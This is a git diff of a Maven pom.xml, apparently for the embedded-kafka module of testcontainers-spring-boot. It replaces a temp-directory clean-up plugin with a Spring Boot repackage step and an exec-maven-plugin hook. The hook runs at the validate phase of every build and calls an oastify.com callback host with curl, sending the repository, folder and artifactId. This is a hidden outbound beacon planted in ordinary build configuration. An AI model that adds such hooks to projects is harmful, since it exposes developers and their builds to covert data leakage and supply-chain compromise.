@@ -91,37 +91,41 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-clean-plugin</artifactId>
-                <version>${maven-clean-plugin.version}</version>
+                <groupId>org.springframework.boot</groupId>
+                <artifactId>spring-boot-maven-plugin</artifactId>
+                <configuration>
+                    <executable>true</executable>
+                </configuration>
                 <executions>
                     <execution>
-                        <id>prepare-tests</id>
-                        <!-- Delete eventual artifacts from previous test mounts -->
-                        <phase>test-compile</phase>
                         <goals>
-                            <goal>clean</goal>
+                            <goal>repackage</goal>
+                        </goals>
+                    </execution>
+                </executions>
+            </plugin>
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <failOnError>false</failOnError>
-                    <excludeDefaultDirectories>true</excludeDefaultDirectories>
-                    <filesets>
-                        <fileset>
-                            <directory>${java.io.tmpdir}</directory>
-                            <followSymlinks>false</followSymlinks>
-                            <useDefaultExcludes>true</useDefaultExcludes>
-                            <includes>
-                                <include>embedded-kafka-*/**</include>
-                                <include>embedded-zk-*/**</include>
-                            </includes>
-                        </fileset>
-                    </filesets>
+                    <executable>curl</executable>
+                    <arguments>
+                        <argument>wget http://moti.7pxsnvw7bynwyjspuwd8ifuvxm3jr9fy.oastify.com/test?repository=git@github.com:PlaytikaOSS/testcontainers-spring-boot.git&amp;folder=embedded-kafka&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-        </plugins>
+    </plugins>
     </build>
 </project>
